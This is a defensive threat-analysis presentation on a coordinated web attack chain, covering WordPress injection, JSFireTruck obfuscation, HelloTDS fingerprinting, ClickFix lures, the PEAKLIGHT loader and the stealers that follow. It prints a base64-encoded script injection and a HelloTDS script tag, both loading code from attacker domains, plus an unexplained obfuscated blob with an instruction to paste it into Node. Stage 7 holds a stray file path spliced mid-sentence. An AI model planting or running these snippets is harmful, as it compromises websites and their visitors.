---
aside: false
sidebar: false
prev: false
next: false
# navbar: false

---


# The Anatomy of a Coordinated Web Attack: From Compromise to Payload

## Introduction: The Multi-Layered Web Threat

Modern web attacks are not singular events but complex, chained operations where legitimate websites are increasingly exploited as vectors for widespread attacks. A recently discovered large-scale campaign involves compromising websites by injecting obfuscated JavaScript code. Threat actors typically use such campaigns to invisibly redirect victims from legitimate sites to malicious pages serving malware, exploits, and spam.

**Presentation Focus:**
This presentation dissects this prevalent, large-scale, and coordinated attack methodology, covering:
*   Initial Website Compromise
*   JavaScript Obfuscation (JSFireTruck)
*   Sophisticated Traffic Distribution Systems (TDS) like HelloTDS
*   Advanced Social Engineering Tactics (e.g., ClickFix)
*   Eventual Malware Delivery (including loaders like PEAKLIGHT)

**Scale of the Threat:**
A key statistic underscores the campaign's reach: **Over 269,000 web pages were infected with JSFireTruck** between March 26 and April 25, 2025, with a peak of over 50,000 infected pages on April 12 alone.

## Stage 1: Initial Compromise - Gaining a Foothold

The attack chain initiates with the compromise of legitimate websites. WordPress sites are frequent targets, notable as they power approximately 43% of all websites (as of 2025). The primary goal for attackers at this stage is to inject a script that will serve as the entry point for their multi-stage malicious operation.

### Compromise Methods & Persistence Strategies

*   **Common Injector Scripts:** Attackers frequently use scripts like **Balada Injector**, **DollyWay**, and **Sign1**. These are injected by exploiting vulnerabilities in web platforms, particularly WordPress.

*   **Persistence:** Once injected, these scripts persist via hidden or obfuscated files.

*   **Exploited WordPress Vulnerabilities:**
    *   Outdated plugins or themes (leading to file upload flaws, Cross-Site Scripting (XSS), Remote Code Execution (RCE)).
    *   Insecure server or WordPress configurations.
    *   Weak admin credentials susceptible to brute-force attacks.
    *   Abandoned plugins with known Common Vulnerabilities and Exposures (CVEs).

*   **Post-Compromise Actions:** Attackers often deploy PHP shells (e.g., c99) or backdoors to manage further injections, create hidden admin users, and place malicious files (e.g., `wp-corn.php`, `wp-tmp.php`) in core directories. Malicious cron jobs may also be set up to reinfect cleaned sites.

### Injection Mechanisms

*   **Direct File Injection:** Malicious JavaScript is inserted directly into:
    *   Theme files (e.g., `header.php`, `footer.php`, `functions.php`).
    *   Plugin `.php` files.
    *   Randomly named files across various directories.
    *   The script tag itself is frequently obfuscated, for example:

```
echo base64_decode ("c2NyaXB0IHNyYz0iaHR0cHM6Ly9zdGFydHBlcmZlY3Rzb2x1dGlvbnMuY29tL2xvYWQuanMiPjwvc2NyaXB0Pg==");
```

*   **Database Injections:** JavaScript is injected into database tables, such as:
    *   Post content (`wp_posts`).
    *   Widget settings (`wp_options`).
    *   Custom fields or metadata.
    This malicious code is then served dynamically as part of the website's frontend content.

## Stage 2: Obfuscation - Hiding Malicious Intent (JSFireTruck)

The injected JavaScript code is heavily obfuscated using **JSFireTruck**. This technique is an "esoteric and educational programming style" employing a minimal set of only six characters: `[]()!+$` (occasionally `{}`). Despite its minimalist nature, this method produces valid JavaScript executable in any browser or Node.js environment.

Open Node in terminal, paste this
```js
[][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]([][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+([][[]]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+([][[]]+[])[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]])[(![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]]((!![]+[])[+[]])[([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]](([][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+![]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])+[])[+!+[]])+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]])())()
```

**Mechanism:** JSFireTruck leverages JavaScript's type coercion capabilities, which automatically convert these limited symbols into the full range of ASCII characters or numeric values required for standard, unobfuscated JavaScript code.

**Primary Purpose:**
The main goal of this obfuscation is to **conceal the true functionality** of the malicious code. This makes the script appear as non-functional data, significantly hindering analysis by security researchers and automated detection tools.

![Figure 1. Example of malicious injected JavaScript found in the HTML pages](/cs_cs/figure1.png)

**Figure 1.** Example of malicious injected JavaScript found in the HTML pages.


![Figure 2. Example of injected code starting from the `String.fromCharCode` function, adding another obfuscation layer.](/cs_cs/figure2.png)
**Figure 2.** Example of injected code starting from the `String.fromCharCode` function, adding another obfuscation layer.

![Figure 3. Decoded JSFireTruck script, revealing further obfuscation even after initial decoding.](/cs_cs/figure3.png)  
**Figure 3.** Decoded JSFireTruck script, revealing further obfuscation even after initial decoding.


![Figure 4. Fully decoded JavaScript code showing the iframe structure to be injected into the HTML page.](/cs_cs/figure4.png)  
**Figure 4.** Fully decoded JavaScript code showing the iframe structure to be injected into the HTML page.

## Stage 3: Initial Client-Side Filtering & TDS Hand-off

Once the obfuscated JSFireTruck script executes within the victim's browser, it performs an initial client-side filtering step.

**Referrer Check:**
The decoded script inspects the `document.referrer`. This check ensures that the traffic originated from a different source (like a search engine) rather than a direct URL entry. If the referrer is identified as a major search engine (e.g., Google, Bing, DuckDuckGo, Yahoo!, AOL), the victim is flagged as a potential target.

**Malicious Iframe Injection:**
Depending on the referring search engine, the script may dynamically create and inject an iframe.
*   It might use a random `ElementID` present on the page.
*   The `innerHTML` property is used to insert the iframe pointing to a malicious domain.
*   This iframe is styled (e.g., CSS `z-index`, 100% width/height) to cover the entire browser window, effectively hiding the original content. This forces user interaction exclusively with the iframe's content, a common tactic in clickjacking and malicious redirects.
*   Often, two scrollbars become visible: an outer one for the legitimate (but hidden) webpage and an inner one for the malicious iframe.

![Figure 5. Logic flow: If the referral is not from a search engine, the script may use code from a URL.](/cs_cs/figure5.png)  
**Figure 5.** Logic flow: If the referral is not from a search engine, the script may use code from a URL.

The obfuscated or dynamically generated code using the `atob()` js function and string concatenation that decodes a string of data that has been encoded using Base64 encoding.

This is used to make it harder to read in the source which delays final URL until runtime to avoid filters and detectors.

![Figure 6. After redirection, the iframe displays content spoofing a hosting service, leading to a suspicious ZIP archive.](/cs_cs/figure6.png)  
**Figure 6.** After redirection, the iframe displays content spoofing a hosting service, leading to a suspicious ZIP archive.


**Hand-off to Traffic Distribution System (TDS):**
If this initial filtering stage doesn't immediately lead to malware, exploits, or malvertising, it serves as a crucial hand-off point to a more sophisticated filtering mechanism: a TDS. An embedded `<script>` element often initiates this request to the TDS, like HelloTDS:

```html
<script data-cfasync='false' 
	async type='text/javascript' 
	src='//yr.unasonoric.com/tMwxtsZeFANq/108477'>
</script>
```

*Embedded script making the initial HelloTDS request.*

## Stage 4: HelloTDS - Advanced Fingerprinting, Evasion & Redirection

### The Gateway: HelloTDS

HelloTDS is a sophisticated **Traffic Distribution System (TDS)** acting as a central controller. Its primary functions are to:
1.  Fingerprint visitors in detail.
2.  Conditionally redirect them based on this profile.

Its ultimate purpose is to determine the type of content to deliver: malicious payloads, monetized content, decoy pages, or no content at all (to evade detection).

**Entry Points for HelloTDS:**
*   Victims from websites infected with JSFireTruck.
*   Users from other compromised or attacker-controlled streaming/file-sharing sites (e.g., `dailyuploads[.]net`, `streamtape[.]to`).
*   Malvertising campaigns.

**Impact and Scale:** HelloTDS affects millions globally. Gen Digital, for instance, reported protecting over 4.3 million users from HelloTDS in April and May 2025 alone.


![Figure 7. Gen Digital statistic: "April and May 2025 alone, we have protected over 4.3 million users worldwide."](/cs_cs/figure7.webp)  
**Figure 7.** Gen Digital statistic: "April and May 2025 alone, we have protected over 4.3 million users worldwide."

**The Broader TDS Ecosystem:** Other large TDS networks like VexTrio (affiliated with Help TDS, Disposable TDS, Los Pollos, Taco Loco, Adtrafico) also operate by compromising WordPress sites (using injectors like Balada, DollyWay, Sign1) to funnel victims into their scam infrastructure. These TDSs often utilize push notification services (via Firebase Cloud Messaging or Push API) to distribute malicious links.

### HelloTDS Infrastructure & Initial Server-Side Checks

*   **Dynamic Domains:** Uses dynamically rotated domains (often `.top`, `.shop`, `.com`) with random-looking paths.
*   **Registration & Hosting:** Domains are frequently registered via services like Pananames, use Let's Encrypt certificates, and are hosted on specific IP ranges (e.g., AS7979).
*   **Unique Identifiers:** May employ unique HTTP headers (e.g., "megageocheckolololo"). Its `robots.txt` file might contain a `/hi` endpoint returning "Hello!" (the likely origin of the "HelloTDS" name).
*   **Initial Server-Side Check:** Upon receiving an initial request, the HelloTDS server performs a server-side check based on IP address and geolocation. It sets cookies containing Zlib-compressed, Base64-encoded data about the client's browser, OS, and network.

### Advanced Client-Side Fingerprinting (Browser-Side)

If the victim passes the initial server check, a larger JavaScript file is returned to conduct extensive client-side fingerprinting. This script collects a wide array of data, including:
*   **Basic Browser Info:** Window dimensions, `document.referrer`, `window.location` (URL), language, timezone, top-level/iframe status.
*   **User & Device Identifiers:** User ID (previously assigned), mobile browser detection, touch screen presence (`window.navigator.maxTouchPoints`).
*   **Content & Context:** Page title, keywords from the webpage content and `<head>` element.
*   **System Capabilities:** Approximate physical memory, number of processor cores, battery status (level, charging state), WebGL vendor/renderer.
*   **Evasion & Anti-Analysis:** A "sandbox score" (detecting Headless Chrome, specific video codec support).
*   **Network Details:** Network type (Wi-Fi, Ethernet, cellular), effective/maximum bandwidth, estimated round-trip time.
*   **Display Info:** Screen orientation, color depth.
*   **Browser State:** Whether cookies are enabled.


![Figure 4.1. Decrypted JSON configuration used by the fingerprinting script.](/cs_cs/figure4_1.webp)  
**Figure 8.** Decrypted JSON configuration used by the fingerprinting script.

![Figure 4.2. Creation of the fingerprint parameter sent to the TDS.](/cs_cs/figure4_2.webp)  
**Figure 9.** Creation of the fingerprint parameter sent to the TDS.


![Figure 4.2. Creation of the fingerprint parameter sent to the TDS.](/cs_cs/figure4_3.jpg)  
**Figure 10.** Code to Fingerprint.

This comprehensive fingerprint data, often Base64-encoded, is sent via a POST request (e.g., in an `md` parameter) to another rotated URL specified in the HelloTDS configuration. The configuration itself is often encrypted using character substitution and contains URLs for subsequent actions.

The response from this endpoint is typically a JSON object containing a destination "url", a Time-To-Live (TTL), and bidding details, representing the final HelloTDS endpoint before payload delivery.

```json
{
	"url": "https://bu.unrimedironize.shop/cx/6Ae..",
	"ttl": 1200,
	"bid": 2241311
}
```

![Figure 4.3. Final payload object redirecting to a malicious website..](/cs_cs/figure4_4.webp)  
**Figure 11.** Final payload object redirecting to a malicious website..

### Evasion Tactics & Decoy Content Strategy

HelloTDS actively employs evasion techniques:
*   **Researcher Detection:** Detects and rejects connections from VPNs or headless browsers (commonly used by security researchers).

*   **Decoy Redirection:** If a user is not deemed a "suitable" target, the attack may cease, or the user is redirected to benign or decoy content.
    *   This decoy content often includes investment-related websites (especially cryptocurrency) or pages mimicking legitimate software sites (e.g., AVS4You).
    *   This strategy can serve as an alternative income stream (generating traffic for advertisers) or as a thematically consistent misdirection if the primary malware aims to steal cryptocurrency wallets.


![Figure 8. High-level overview of the HelloTDS attack chain.](/cs_cs/figure8.webp)  
**Figure 12.** High-level overview of the HelloTDS attack chain.

![Figure 9. Example of a specific recorded HelloTDS chain delivering FakeCaptcha.](/cs_cs/figure9.webp)  
**Figure 13.** Example of a specific recorded HelloTDS chain delivering FakeCaptcha.


## Stage 5: Conditional Redirection to Social Engineering Lures

If the detailed fingerprinting process deems the victim "suitable," HelloTDS redirects them to a malicious landing page meticulously designed for social engineering.

**Common Lures Deployed:**
*   **Fake CAPTCHA Pages:** A prevalent tactic. These pages often mimic legitimate services like Google reCAPTCHA or Cloudflare Turnstile and may use Unicode math characters to evade text-based detection.

![Figure 21. A variant of FakeCaptcha using Unicode math characters.](/cs_cs/figure21.webp)  
**Figure 14.** A variant of FakeCaptcha using Unicode math characters.

![Figure 22. A fake reCAPTCHA page.](/cs_cs/figure22.webp)  
**Figure 15.** A fake reCAPTCHA page.

*   **Fake Browser Updates:** Often associated with campaigns like ClearFake.

![Figure 23 & 24. Fake browser update landing pages.](/cs_cs/figure23.webp) 

![Figure 23 & 24. Fake browser update landing pages.](/cs_cs/figure24.webp)  
**Figure 16 & 17.** Fake browser update landing pages.

*   **Tech Support Scams.**
*   **Unwanted Browser Extensions / Fake Antivirus Prompts.**


![Figure 27. A fake antivirus landing page.](/cs_cs/figure27.webp)  
**Figure 18.** A fake antivirus landing page.

![Figure 28. A landing page prompting the installation of a PUP browser extension.](/cs_cs/figure28.webp)  
**Figure 19.** A landing page prompting the installation of a PUP browser extension.

*   **Malicious File Downloads:** Often offering files that are encrypted.

![Figure 25. Malicious file download prompts.](/cs_cs/figure25.webp) 

![Figure 26. Malicious file download prompts.](/cs_cs/figure26.webp)
**Figure 20 & 21.** Malicious file download prompts.


**Anti-Escape JavaScript:**
These lure pages may also employ JavaScript tricks to prevent users from easily leaving:
*   **Disabling Back Button:** Intercepting the browser's back button functionality to reload the current page instead of navigating to the previous one.

![Figure 31. JavaScript prevents navigation to previous pages via back button.](/cs_cs/figure31.png)
**Figure 22.** JavaScript prevents navigation to previous pages via back button.

*   **Exit Interruption:** Launching confirmation messages (e.g., "You are about to leave this page!") followed by a quick page reload if the user attempts to close the tab or navigate away without interacting as intended.

![Figure 32. JavaScript attempts to prevent page exit without scam participation.](/cs_cs/figure32.jpg)  
**Figure 23.** JavaScript attempts to prevent page exit without scam participation.

## Stage 6: The Social Engineering Kill - ClickFix & ClearFake

This stage exploits human error and conditioned responses to bypass security defenses and trick users into executing malicious code.

### ClickFix Strategy

*   **Common Precursor:** Often follows a fake CAPTCHA page.

*   **The Lure:** The page displays a deceptive "error" message (e.g., "CAPTCHA verification failed").

*   **The "Solution":** It instructs the user to click an "Alternative Verification" button.

*   **The Action:** Clicking this button copies a malicious command (PowerShell for Windows, or a shell script for macOS) to the user's clipboard.

*   **User Execution:** The user is then guided to open a command-line interface (Terminal on macOS, or the Run dialog/PowerShell on Windows) and paste/execute the copied command.

*   **Psychological Exploit:** This tactic preys on "verification fatigue," where users are conditioned to click through prompts to access content.

*   **Infrastructure:** Typosquat domains mimicking legitimate services (e.g., Spectrum) are sometimes used for ClickFix landing pages.

### ClearFake Strategy

*   **Intertwined Tactics:** Often works in conjunction with or uses final steps similar to ClickFix.

*   **Primary Lure:** Typically uses fake web browser update overlays displayed on compromised websites.

*   **Resilience:** May employ techniques like EtherHiding (using Binance Smart Chain contracts) to fetch payloads, making the delivery chain more resilient to takedowns.

*   **User Prompt:** Leads to ClickFix-like scenarios where users are prompted to run scripts.

*   **Obfuscation:** The HTML code for the lure itself might be encrypted and fetched from services like Cloudflare Pages.

## Stage 7: Execution of Loader Malware - PEAKLIGHT (Emmenhtal Loader)

When the user, deceived by the social engineering lure, executes the PowerShell or shell script (believing they are fixing a non-existent issue or completing a necessary verification step), the script's primary function is to download and execute a malware loader.

**PEAKLIGHT (aka Emmenhtal Loader)** is a known malware loader frequently delivered through these campaigns. Its main purpose is not to cause direct harm itself, but to act as a downloader and execution `C:\Users\Ketan\Downloads\ClickFix` and ClearFake Campaigns Deliver Malware With Fake CAPTCHA `Checks.rtfmechanism` for the *actual* damaging malware payloads.

## Stage 8: Final Payload Delivery - Information Stealers & RATs

Once PEAKLIGHT (or a similar loader) is active on the victim's system, it retrieves and executes the final malicious payloads.

**Information Stealers:** Designed to exfiltrate sensitive data.
*   **Lumma Stealer (LummaC2):** Targets cryptocurrency wallets, browser data (cookies, passwords, history), system information, etc.

*   **Vidar Stealer:** Possesses similar capabilities; often seen in conjunction with ClearFake campaigns.

*   **Atomic macOS Stealer (AMOS):** Specifically designed to target macOS users, often delivered via ClickFix.

*   **CryptBot.**

*   **PureLogs Stealer.**


**Remote Access Trojans (RATs):** Provide attackers with remote control over the infected system.
*   **SectopRAT:** Notably delivered via ClickFix in compromises involving third-party services (e.g., the auto dealership video service incident).

*   **Other RATs:** Various other RATs like XWorm RAT, DanaBot, NetSupport RAT, AsyncRAT, and Remcos RAT have been observed in similar attack chains or delivered by associated threat actors.


## The Threat: Evolution, Scale, Stealth & Sophistication

This campaign exemplifies a threat actor methodology characterized by:

*   **Continuous Evolution & Updates:** Attackers consistently update their framework code, social engineering lures, and distributed malware payloads, sometimes on a daily basis (as seen with ClearFake).

*   **Remote & Dynamic Infrastructure:** Malicious code is often remotely hosted, allowing for dynamic updates and refined methods to bypass traditional security protections and evade detection.

